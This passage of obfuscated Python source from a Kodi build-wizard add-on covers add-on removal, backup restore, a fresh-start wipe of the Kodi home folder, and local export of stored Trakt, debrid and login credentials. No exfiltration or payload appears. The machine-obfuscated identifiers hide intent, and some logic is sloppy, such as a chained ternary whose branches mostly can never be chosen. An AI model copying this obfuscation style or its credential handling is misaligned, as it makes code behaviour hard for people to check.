					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .title ).setLabel (O0OO0O0O0000O0OOO .titlemsg )#line:4621
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .msg ).setText (wiz .highlightText (O0000O00000000O0O ))#line:4622
					O0OO0O0O0000O0OOO .setFocusId (O0OO0O0O0000O0OOO .scrollbar )#line:4623
		def onAction (OO0000OOOO00OO00O ,O00OOOO00OO00O0OO ):#line:4625
			if O00OOOO00OO00O0OO ==ACTION_PREVIOUS_MENU :OO0000OOOO00OO00O .close ()#line:4626
			elif O00OOOO00OO00O0OO ==ACTION_NAV_BACK :OO0000OOOO00OO00O .close ()#line:4627
	if default ==None :default =wiz .Grab_Log (True )#line:4628
	O00O0OO000O00O0OO =OO0O000O00OOO0OOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4629
	O00O0OO000O00O0OO .doModal ()#line:4630
	del O00O0OO000O00O0OO #line:4631
def removeAddon (O000OOOOOOO000O00 ,O0OOOOOO0OOO000O0 ,over =False ):#line:4633
	if not over ==False :#line:4634
		OOO00OOO0O000O00O =1 #line:4635
	else :#line:4636
		OOO00OOO0O000O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOOOO0OOO000O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O000OOOOOOO000O00 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4637
	if OOO00OOO0O000O00O ==1 :#line:4638
		O00OO00OO0O0OOOOO =os .path .join (ADDONS ,O000OOOOOOO000O00 )#line:4639
		wiz .log ("Removing Addon %s"%O000OOOOOOO000O00 )#line:4640
		wiz .cleanHouse (O00OO00OO0O0OOOOO )#line:4641
		xbmc .sleep (1000 )#line:4642
		try :shutil .rmtree (O00OO00OO0O0OOOOO )#line:4643
		except Exception as O000OOOOO0OOOOOOO :wiz .log ("Error removing %s"%O000OOOOOOO000O00 ,xbmc .LOGNOTICE )#line:4644
		removeAddonData (O000OOOOOOO000O00 ,O0OOOOOO0OOO000O0 ,over )#line:4645
	if over ==False :#line:4646
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OOOOOO0OOO000O0 ))#line:4647
def removeAddonData (OOOOO000O0OOO00OO ,name =None ,over =False ):#line:4649
	if OOOOO000O0OOO00OO =='all':#line:4650
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4651
			wiz .cleanHouse (ADDOND )#line:4652
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4653
	elif OOOOO000O0OOO00OO =='uninstalled':#line:4654
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4655
			OOO00O0O0O00OO00O =0 #line:4656
			for O0OOOO00OOOOOOOOO in glob .glob (os .path .join (ADDOND ,'*')):#line:4657
				OOOO0O000O0O0O000 =O0OOOO00OOOOOOOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4658
				if OOOO0O000O0O0O000 in EXCLUDES :pass #line:4659
				elif os .path .exists (os .path .join (ADDONS ,OOOO0O000O0O0O000 )):pass #line:4660
				else :wiz .cleanHouse (O0OOOO00OOOOOOOOO );OOO00O0O0O00OO00O +=1 ;wiz .log (O0OOOO00OOOOOOOOO );shutil .rmtree (O0OOOO00OOOOOOOOO )#line:4661
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO00O0O0O00OO00O ))#line:4662
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4663
	elif OOOOO000O0OOO00OO =='empty':#line:4664
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4665
			OOO00O0O0O00OO00O =wiz .emptyfolder (ADDOND )#line:4666
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO00O0O0O00OO00O ))#line:4667
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4668
	else :#line:4669
		OOOOOO0O00O0OO000 =os .path .join (USERDATA ,'addon_data',OOOOO000O0OOO00OO )#line:4670
		if OOOOO000O0OOO00OO in EXCLUDES :#line:4671
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4672
		elif os .path .exists (OOOOOO0O00O0OO000 ):#line:4673
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO000O0OOO00OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4674
				wiz .cleanHouse (OOOOOO0O00O0OO000 )#line:4675
				try :#line:4676
					shutil .rmtree (OOOOOO0O00O0OO000 )#line:4677
				except :#line:4678
					wiz .log ("Error deleting: %s"%OOOOOO0O00O0OO000 )#line:4679
			else :#line:4680
				wiz .log ('Addon data for %s was not removed'%OOOOO000O0OOO00OO )#line:4681
	wiz .refresh ()#line:4682
def restoreit (OOOO000O000000000 ):#line:4684
	if OOOO000O000000000 =='build':#line:4685
		O000O00O0OOO00OO0 =freshStart ('restore')#line:4686
		if O000O00O0OOO00OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4687
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4688
		wiz .skinToDefault ()#line:4689
	wiz .restoreLocal (OOOO000O000000000 )#line:4690
def restoreextit (OOOO0O0O00O0OO0OO ):#line:4692
	if OOOO0O0O00O0OO0OO =='build':#line:4693
		O0OOO00000OOOO00O =freshStart ('restore')#line:4694
		if O0OOO00000OOOO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4695
	wiz .restoreExternal (OOOO0O0O00O0OO0OO )#line:4696
def buildInfo (O0O00O0O000OOOO00 ):#line:4698
	if wiz .workingURL (SPEEDFILE )==True :#line:4699
		if wiz .checkBuild (O0O00O0O000OOOO00 ,'url'):#line:4700
			O0O00O0O000OOOO00 ,O0O00OOOOOO0OOO00 ,OO0O0O0OO0O0000OO ,OO0O00O000O00O00O ,O00O00OOO0O0O0OOO ,O0OOOO0000000OOOO ,O00OOOO0OO00OO00O ,OO00O0O0000OOO000 ,O0O00OOOO0OOOOO0O ,OO0OO00OOO0OO0OO0 ,OOOO00OOOOOOO00O0 =wiz .checkBuild (O0O00O0O000OOOO00 ,'all')#line:4701
			OO0OO00OOO0OO0OO0 ='Yes'if OO0OO00OOO0OO0OO0 .lower ()=='yes'else 'No'#line:4702
			O000OO00OO0OO0OOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00O0O000OOOO00 )#line:4703
			O000OO00OO0OO0OOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OOOOOO0OOO00 )#line:4704
			if not O0OOOO0000000OOOO =="http://":#line:4705
				OO0OOOO00OOOO00OO =wiz .themeCount (O0O00O0O000OOOO00 ,False )#line:4706
				O000OO00OO0OO0OOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO0OOOO00OOOO00OO ))#line:4707
			O000OO00OO0OO0OOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O00OOO0O0O0OOO )#line:4708
			O000OO00OO0OO0OOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO00OOO0OO0OO0 )#line:4709
			O000OO00OO0OO0OOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO00OOOOOOO00O0 )#line:4710
			wiz .TextBox (ADDONTITLE ,O000OO00OO0OO0OOO )#line:4711
		else :wiz .log ("Invalid Build Name!")#line:4712
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4713
def buildVideo (OOO00O0OOOO0OO0OO ):#line:4715
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4716
	if wiz .workingURL (SPEEDFILE )==True :#line:4717
		OO0O00O00O0OO0OOO =wiz .checkBuild (OOO00O0OOOO0OO0OO ,'preview')#line:4718
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOO00O0OOOO0OO0OO )#line:4719
		if OO0O00O00O0OO0OOO and not OO0O00O00O0OO0OOO =='http://':playVideo (OO0O00O00O0OO0OOO )#line:4720
		else :wiz .log ("[%s]Unable to find url for video preview"%OOO00O0OOOO0OO0OO )#line:4721
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4722
def dependsList (OO0OO0O00000O000O ):#line:4724
	OO0OOO0O0O0OOOOO0 =os .path .join (ADDONS ,OO0OO0O00000O000O ,'addon.xml')#line:4725
	if os .path .exists (OO0OOO0O0O0OOOOO0 ):#line:4726
		OOOO00O00O0O0OO0O =open (OO0OOO0O0O0OOOOO0 ,mode ='r');OOO00O0O0OO0OOOO0 =OOOO00O00O0O0OO0O .read ();OOOO00O00O0O0OO0O .close ();#line:4727
		OOO000000O000O00O =wiz .parseDOM (OOO00O0O0OO0OOOO0 ,'import',ret ='addon')#line:4728
		O0O0000OOO0000OO0 =[]#line:4729
		for O00OO0000O000O0OO in OOO000000O000O00O :#line:4730
			if not 'xbmc.python'in O00OO0000O000O0OO :#line:4731
				O0O0000OOO0000OO0 .append (O00OO0000O000O0OO )#line:4732
		return O0O0000OOO0000OO0 #line:4733
	return []#line:4734
def manageSaveData (O00OOO0OOOO00000O ):#line:4736
	if O00OOO0OOOO00000O =='import':#line:4737
		O0000O0O0OO00000O =os .path .join (ADDONDATA ,'temp')#line:4738
		if not os .path .exists (O0000O0O0OO00000O ):os .makedirs (O0000O0O0OO00000O )#line:4739
		O0OOO000O00000000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4740
		if not O0OOO000O00000000 .endswith ('.zip'):#line:4741
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4742
			return #line:4743
		O0000000OO0O0O0O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4744
		O0000O00O00OOOOO0 =xbmcvfs .copy (O0OOO000O00000000 ,O0000000OO0O0O0O0 )#line:4745
		wiz .log ("%s"%str (O0000O00O00OOOOO0 ))#line:4746
		extract .all (xbmc .translatePath (O0000000OO0O0O0O0 ),O0000O0O0OO00000O )#line:4747
		O00O000OO0000OO0O =os .path .join (O0000O0O0OO00000O ,'trakt')#line:4748
		O0OO00O0OOOO00OO0 =os .path .join (O0000O0O0OO00000O ,'login')#line:4749
		OOOOOOO000O00O00O =os .path .join (O0000O0O0OO00000O ,'debrid')#line:4750
		OO0OO00O00OOOOO00 =0 #line:4751
		if os .path .exists (O00O000OO0000OO0O ):#line:4752
			OO0OO00O00OOOOO00 +=1 #line:4753
			O0OO0OOO00OOO0O00 =os .listdir (O00O000OO0000OO0O )#line:4754
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4755
			for O00O0OOO000O000OO in O0OO0OOO00OOO0O00 :#line:4756
				OOO00OOO00O00O0O0 =os .path .join (traktit .TRAKTFOLD ,O00O0OOO000O000OO )#line:4757
				OO0000O00OO0O0000 =os .path .join (O00O000OO0000OO0O ,O00O0OOO000O000OO )#line:4758
				if os .path .exists (OOO00OOO00O00O0O0 ):#line:4759
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O0OOO000O000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4760
					else :os .remove (OOO00OOO00O00O0O0 )#line:4761
				shutil .copy (OO0000O00OO0O0000 ,OOO00OOO00O00O0O0 )#line:4762
			traktit .importlist ('all')#line:4763
			traktit .traktIt ('restore','all')#line:4764
		if os .path .exists (O0OO00O0OOOO00OO0 ):#line:4765
			OO0OO00O00OOOOO00 +=1 #line:4766
			O0OO0OOO00OOO0O00 =os .listdir (O0OO00O0OOOO00OO0 )#line:4767
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4768
			for O00O0OOO000O000OO in O0OO0OOO00OOO0O00 :#line:4769
				OOO00OOO00O00O0O0 =os .path .join (loginit .LOGINFOLD ,O00O0OOO000O000OO )#line:4770
				OO0000O00OO0O0000 =os .path .join (O0OO00O0OOOO00OO0 ,O00O0OOO000O000OO )#line:4771
				if os .path .exists (OOO00OOO00O00O0O0 ):#line:4772
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O0OOO000O000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4773
					else :os .remove (OOO00OOO00O00O0O0 )#line:4774
				shutil .copy (OO0000O00OO0O0000 ,OOO00OOO00O00O0O0 )#line:4775
			loginit .importlist ('all')#line:4776
			loginit .loginIt ('restore','all')#line:4777
		if os .path .exists (OOOOOOO000O00O00O ):#line:4778
			OO0OO00O00OOOOO00 +=1 #line:4779
			O0OO0OOO00OOO0O00 =os .listdir (OOOOOOO000O00O00O )#line:4780
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4781
			for O00O0OOO000O000OO in O0OO0OOO00OOO0O00 :#line:4782
				OOO00OOO00O00O0O0 =os .path .join (debridit .REALFOLD ,O00O0OOO000O000OO )#line:4783
				OO0000O00OO0O0000 =os .path .join (OOOOOOO000O00O00O ,O00O0OOO000O000OO )#line:4784
				if os .path .exists (OOO00OOO00O00O0O0 ):#line:4785
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O0OOO000O000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4786
					else :os .remove (OOO00OOO00O00O0O0 )#line:4787
				shutil .copy (OO0000O00OO0O0000 ,OOO00OOO00O00O0O0 )#line:4788
			debridit .importlist ('all')#line:4789
			debridit .debridIt ('restore','all')#line:4790
		wiz .cleanHouse (O0000O0O0OO00000O )#line:4791
		wiz .removeFolder (O0000O0O0OO00000O )#line:4792
		os .remove (O0000000OO0O0O0O0 )#line:4793
		if OO0OO00O00OOOOO00 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4794
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4795
	elif O00OOO0OOOO00000O =='export':#line:4796
		O00O0OOOO0000OOO0 =xbmc .translatePath (MYBUILDS )#line:4797
		OO00O00O00OO0000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4798
		traktit .traktIt ('update','all')#line:4799
		loginit .loginIt ('update','all')#line:4800
		debridit .debridIt ('update','all')#line:4801
		O0OOO000O00000000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4802
		O0OOO000O00000000 =xbmc .translatePath (O0OOO000O00000000 )#line:4803
		O00OO0O00000OO0O0 =os .path .join (O00O0OOOO0000OOO0 ,'SaveData.zip')#line:4804
		O0OOOO0OO00OO000O =zipfile .ZipFile (O00OO0O00000OO0O0 ,mode ='w')#line:4805
		for O00OO0OOOOO0O00O0 in OO00O00O00OO0000O :#line:4806
			if os .path .exists (O00OO0OOOOO0O00O0 ):#line:4807
				O0OO0OOO00OOO0O00 =os .listdir (O00OO0OOOOO0O00O0 )#line:4808
				for O00OOO00OOO0OOOOO in O0OO0OOO00OOO0O00 :#line:4809
					O0OOOO0OO00OO000O .write (os .path .join (O00OO0OOOOO0O00O0 ,O00OOO00OOO0OOOOO ),os .path .join (O00OO0OOOOO0O00O0 ,O00OOO00OOO0OOOOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4810
		O0OOOO0OO00OO000O .close ()#line:4811
		if O0OOO000O00000000 ==O00O0OOOO0000OOO0 :#line:4812
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0O00000OO0O0 ))#line:4813
		else :#line:4814
			try :#line:4815
				xbmcvfs .copy (O00OO0O00000OO0O0 ,os .path .join (O0OOO000O00000000 ,'SaveData.zip'))#line:4816
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OOO000O00000000 ,'SaveData.zip')))#line:4817
			except :#line:4818
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0O00000OO0O0 ))#line:4819
def freshStart (install =None ,over =False ):#line:4824
	if USERNAME =='':#line:4825
		ADDON .openSettings ()#line:4826
		sys .exit ()#line:4827
	OO0OOOOO0OOOO0OOO =(SPEEDFILE )#line:4828
	(OO0OOOOO0OOOO0OOO )#line:4829
	OO0O00O0000O0OOO0 =(wiz .workingURL (OO0OOOOO0OOOO0OOO ))#line:4830
	(OO0O00O0000O0OOO0 )#line:4831
	if KEEPTRAKT =='true':#line:4832
		traktit .autoUpdate ('all')#line:4833
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4834
	if KEEPREAL =='true':#line:4835
		debridit .autoUpdate ('all')#line:4836
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4837
	if KEEPLOGIN =='true':#line:4838
		loginit .autoUpdate ('all')#line:4839
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4840
	if over ==True :OO0OO0OOO00OO000O =1 #line:4841
	elif install =='restore':OO0OO0OOO00OO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4842
	elif install :OO0OO0OOO00OO000O =1 #line:4843
	else :OO0OO0OOO00OO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4844
	if OO0OO0OOO00OO000O :#line:4845
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4846
			OO0OO00OO000O0O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4847
			skinSwitch .swapSkins (OO0OO00OO000O0O0O )#line:4850
			OOOOO00O0OO0O00O0 =0 #line:4851
			xbmc .sleep (1000 )#line:4852
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO00O0OO0O00O0 <150 :#line:4853
				OOOOO00O0OO0O00O0 +=1 #line:4854
				xbmc .sleep (1000 )#line:4855
				wiz .ebi ('SendAction(Select)')#line:4856
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4857
				wiz .ebi ('SendClick(11)')#line:4858
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4859
			xbmc .sleep (1000 )#line:4860
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4861
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4862
			return #line:4863
		wiz .addonUpdates ('set')#line:4864
		OO0O00O0000O000O0 =os .path .abspath (HOME )#line:4865
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4866
		OO000O000O0OOO000 =sum ([len (O00OO000O000OO000 )for O0000OOO0OO000OOO ,O0000000O000O0OOO ,O00OO000O000OO000 in os .walk (OO0O00O0000O000O0 )]);OOO0OOO0OOO000000 =0 #line:4867
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4868
		EXCLUDES .append ('My_Builds')#line:4869
		EXCLUDES .append ('archive_cache')#line:4870
		EXCLUDES .append ('script.module.requests')#line:4871
		EXCLUDES .append ('myfav.anon')#line:4872
		if KEEPREPOS =='true':#line:4873
			O0O0O0OOOOO0OOOO0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4874
			for O0OO000000OO0O0O0 in O0O0O0OOOOO0OOOO0 :#line:4875
				O0O000O0OO000OOOO =os .path .split (O0OO000000OO0O0O0 [:-1 ])[1 ]#line:4876
				if not O0O000O0OO000OOOO ==EXCLUDES :#line:4877
					EXCLUDES .append (O0O000O0OO000OOOO )#line:4878
		if KEEPSUPER =='true':#line:4879
			EXCLUDES .append ('plugin.program.super.favourites')#line:4880
		if KEEPMOVIELIST =='true':#line:4881
			EXCLUDES .append ('plugin.video.metalliq')#line:4882
		if KEEPMOVIELIST =='true':#line:4883
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4884
		if KEEPADDONS =='true':#line:4885
			EXCLUDES .append ('addons')#line:4886
		if KEEPTELEMEDIA =='true':#line:4887
			EXCLUDES .append ('plugin.video.telemedia')#line:4888
		EXCLUDES .append ('plugin.video.elementum')#line:4893
		EXCLUDES .append ('script.elementum.burst')#line:4894
		EXCLUDES .append ('script.elementum.burst-master')#line:4895
		EXCLUDES .append ('plugin.video.quasar')#line:4896
		EXCLUDES .append ('script.quasar.burst')#line:4897
		EXCLUDES .append ('skin.estuary')#line:4898
		if KEEPWHITELIST =='true':#line:4901
			OO00OO0OOOOOO000O =''#line:4902
			O000OOO0O0O000OO0 =wiz .whiteList ('read')#line:4903
			if len (O000OOO0O0O000OO0 )>0 :#line:4904
				for O0OO000000OO0O0O0 in O000OOO0O0O000OO0 :#line:4905
					try :O000O000OOOOO0OO0 ,OOO00000O00000O0O ,O0OO00OO000OOOOO0 =O0OO000000OO0O0O0 #line:4906
					except :pass #line:4907
					if O0OO00OO000OOOOO0 .startswith ('pvr'):OO00OO0OOOOOO000O =OOO00000O00000O0O #line:4908
					OO0OO0O0OOOOO0OOO =dependsList (O0OO00OO000OOOOO0 )#line:4909
					for O0O0O00O0O0000OO0 in OO0OO0O0OOOOO0OOO :#line:4910
						if not O0O0O00O0O0000OO0 in EXCLUDES :#line:4911
							EXCLUDES .append (O0O0O00O0O0000OO0 )#line:4912
						O00OOO00O0O0OO00O =dependsList (O0O0O00O0O0000OO0 )#line:4913
						for OO00O000O0000OOO0 in O00OOO00O0O0OO00O :#line:4914
							if not OO00O000O0000OOO0 in EXCLUDES :#line:4915
								EXCLUDES .append (OO00O000O0000OOO0 )#line:4916
					if not O0OO00OO000OOOOO0 in EXCLUDES :#line:4917
						EXCLUDES .append (O0OO00OO000OOOOO0 )#line:4918
				if not OO00OO0OOOOOO000O =='':wiz .setS ('pvrclient',O0OO00OO000OOOOO0 )#line:4919
		if wiz .getS ('pvrclient')=='':#line:4920
			for O0OO000000OO0O0O0 in EXCLUDES :#line:4921
				if O0OO000000OO0O0O0 .startswith ('pvr'):#line:4922
					wiz .setS ('pvrclient',O0OO000000OO0O0O0 )#line:4923
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4924
		O00O000OOO000O0OO =wiz .latestDB ('Addons')#line:4925
		for O0O0O0OO0OOO000OO ,O00O0OO0OOO000OO0 ,O0O00O000O00O0O0O in os .walk (OO0O00O0000O000O0 ,topdown =True ):#line:4926
			O00O0OO0OOO000OO0 [:]=[O00O0OO00OO0OOO0O for O00O0OO00OO0OOO0O in O00O0OO0OOO000OO0 if O00O0OO00OO0OOO0O not in EXCLUDES ]#line:4927
			for O000O000OOOOO0OO0 in O0O00O000O00O0O0O :#line:4928
				OOO0OOO0OOO000000 +=1 #line:4929
				O0OO00OO000OOOOO0 =O0O0O0OO0OOO000OO .replace ('/','\\').split ('\\')#line:4930
				OOOOO00O0OO0O00O0 =len (O0OO00OO000OOOOO0 )-1 #line:4932
				if O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4933
				elif O000O000OOOOO0OO0 =='MyVideos99.db'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4934
				elif O000O000OOOOO0OO0 =='MyVideos107.db'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4935
				elif O000O000OOOOO0OO0 =='MyVideos116.db'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4936
				elif O000O000OOOOO0OO0 =='MyVideos99.db'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4937
